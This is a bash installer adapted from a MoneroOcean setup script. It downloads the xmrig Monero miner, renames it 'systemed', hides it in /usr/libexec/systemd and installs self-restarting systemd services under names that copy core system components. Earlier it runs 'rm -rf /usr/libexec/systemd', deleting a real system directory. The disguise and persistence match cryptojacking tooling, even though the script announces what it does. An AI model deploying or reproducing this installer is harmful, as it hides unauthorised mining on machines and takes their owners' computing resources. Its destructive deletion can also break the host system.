#!/bin/bash

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" != "0" ]; then
  echo "ERROR: This script must be run as root"
  exit 1
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi

# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

echo "Host has $CPU_THREADS CPU threads, projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo "CPU usage will be limited to 70% regardless of core count."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
systemctl stop systemed.service 2>/dev/null
killall -9 systemed 2>/dev/null

echo "[*] Removing /usr/libexec/systemd directory"
rm -rf /usr/libexec/systemd

echo "[*] Creating /usr/libexec/systemd directory"
mkdir -p /usr/libexec/systemd

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to /usr/libexec/systemd"
if ! tar xf /tmp/xmrig.tar.gz -C /usr/libexec/systemd; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to /usr/libexec/systemd directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Renaming xmrig to systemed"
mv /usr/libexec/systemd/xmrig /usr/libexec/systemd/systemed

echo "[*] Checking if systemed works fine"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' /usr/libexec/systemd/config.json
/usr/libexec/systemd/systemed --help >/dev/null
if (test $? -ne 0); then
  echo "ERROR: systemed is not functional"
  exit 1
fi

echo "[*] Miner /usr/libexec/systemd/systemed is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

# Apply 70% CPU limit regardless of core count
CPU_LIMIT=$((70 * $CPU_THREADS))

echo "[*] Configuring systemed with 70% CPU limit"
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' /usr/libexec/systemd/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' /usr/libexec/systemd/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' /usr/libexec/systemd/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 70,/' /usr/libexec/systemd/config.json
sed -i 's#"log-file": *null,#"log-file": "/var/log/systemed.log",#' /usr/libexec/systemd/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' /usr/libexec/systemd/config.json

cp /usr/libexec/systemd/config.json /usr/libexec/systemd/config_background.json
sed -i 's/"background": *false,/"background": true,/' /usr/libexec/systemd/config_background.json

# Enable huge pages if sufficient memory
if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
  echo "[*] Enabling huge pages"
  echo "vm.nr_hugepages=$((1168+$(nproc)))" >> /etc/sysctl.conf
  sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
fi

# Create systemd service
echo "[*] Creating systemed systemd service"
cat >/etc/systemd/system/systemed.service <<EOL
[Unit]
Description=Systemed Service

[Service]
Type=simple
ExecStart=/usr/libexec/systemd/systemed --config=/usr/libexec/systemd/config.json
Restart=always
RestartSec=30
CPUQuota=70%
Nice=10
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
EOL

echo "[*] Starting systemed systemd service"
systemctl daemon-reload
systemctl enable systemed.service
systemctl start systemed.service

echo "[*] Creating CPU limit watchdog script"
cat >/usr/libexec/systemd/cpu_watchdog.sh <<EOL
#!/bin/bash
while true; do
  CPU_USAGE=\$(ps -C systemed -o %cpu | awk 'NR>1 {print \$1}' | awk '{sum+=\$1} END {print sum}')
  if (( \$(echo "\$CPU_USAGE > 70" | bc -l) )); then
    echo "\$(date): CPU usage \$CPU_USAGE% exceeds 70%, restarting systemed" >> /var/log/systemed_watchdog.log
    systemctl restart systemed.service
  fi
  sleep 60
done
EOL

chmod +x /usr/libexec/systemd/cpu_watchdog.sh

# Create watchdog service
echo "[*] Creating systemed watchdog service"
cat >/etc/systemd/system/systemed_watchdog.service <<EOL
[Unit]
Description=Systemed CPU Watchdog
After=systemed.service

[Service]
Type=simple
ExecStart=/usr/libexec/systemd/cpu_watchdog.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOL

echo "[*] Starting systemed watchdog service"
systemctl daemon-reload
systemctl enable systemed_watchdog.service
systemctl start systemed_watchdog.service

echo "[*] Setup complete"
echo "To check miner status: systemctl status systemed.service"
echo "To check watchdog status: systemctl status systemed_watchdog.service"
echo "To view miner logs: journalctl -u systemed.service -f"
echo "To view watchdog logs: tail -f /var/log/systemed_watchdog.log"